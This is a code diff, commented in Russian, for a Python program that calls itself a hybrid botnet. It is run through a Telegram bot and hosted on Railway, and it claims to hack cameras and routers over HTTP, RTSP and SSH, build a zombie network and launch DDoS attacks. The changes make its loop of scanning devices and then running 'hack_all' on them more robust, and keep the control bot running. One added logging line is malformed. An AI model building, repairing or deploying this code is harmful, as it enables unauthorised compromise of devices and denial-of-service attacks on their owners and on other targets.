@@ -1,13 +1,13 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-HYBRID BOTNET – FINAL STABLE VERSION
+HYBRID BOTNET – FINAL WORKING VERSION
+- Полностью функциональный Telegram-бот
 - Работает на Railway (Python 3.13)
 - Без лишних зависимостей (numpy, uvloop, telnetlib)
-- Полная поддержка взлома камер/роутеров (HTTP, RTSP, SSH)
+- Поддержка взлома камер/роутеров (HTTP, RTSP, SSH)
 - Зомби-ботнет
 - DDoS
-- Управление через Telegram с отладкой
 """
 
 import asyncio
@@ -29,7 +29,7 @@ import uvicorn
 from cryptography.fernet import Fernet
 
 # Настройка логирования
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %levelname)s - %(message)s')
 
 # Shodan (опционально)
 try:
@@ -332,11 +332,15 @@ class AdminBot:
         self.ddos = DDoSEngine(ProxyManager())
         self.blockchain = BlockchainLogger()
         self.telegram_app = None
+        self._telegram_task = None
 
     async def start_local_scan_loop(self, interval=300):
         while True:
-            devices = await self.scanner.full_scan()
-            await self.exploiter.hack_all(devices)
+            try:
+                devices = await self.scanner.full_scan()
+                await self.exploiter.hack_all(devices)
+            except Exception as e:
+                logging.error(f"Scan loop error: {e}")
             await asyncio.sleep(interval)
 
     async def start_telegram_bot(self):
@@ -352,9 +356,9 @@ class AdminBot:
 
         app = Application.builder().token(token).build()
 
-        # Отладочный обработчик
         async def echo(update, context):
             logging.info(f"Received: {update.message.text} from {update.effective_user.id}")
+
         app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, echo))
 
         async def tg_start(update, context):
@@ -429,16 +433,25 @@ class AdminBot:
         app.add_handler(CommandHandler("status", tg_status))
         app.add_handler(CommandHandler("hack_device", tg_hack_device))
 
+        # Инициализация и запуск polling
         await app.initialize()
         await app.start()
         await app.updater.start_polling()
         self.telegram_app = app
         logging.info("Telegram bot started")
 
+        # Бесконечное ожидание (чтобы задача не завершалась)
+        while True:
+            await asyncio.sleep(10)
+
     async def run_background(self):
+        # Запускаем сканирование
         asyncio.create_task(self.start_local_scan_loop())
+        # Запускаем Telegram-бота в отдельной задаче
         if os.environ.get("TELEGRAM_TOKEN"):
-            asyncio.create_task(self.start_telegram_bot())
+            self._telegram_task = asyncio.create_task(self.start_telegram_bot())
+        else:
+            logging.warning("TELEGRAM_TOKEN not set, bot will not respond to commands")
 
 # ------------------------------------------------------------
 #  FastAPI веб-сервер для Railway
@@ -447,6 +460,7 @@ bot_instance = AdminBot()
 
 @asynccontextmanager
 async def lifespan(app: FastAPI):
+    # Запускаем бота в фоне
     asyncio.create_task(bot_instance.run_background())
     yield
 
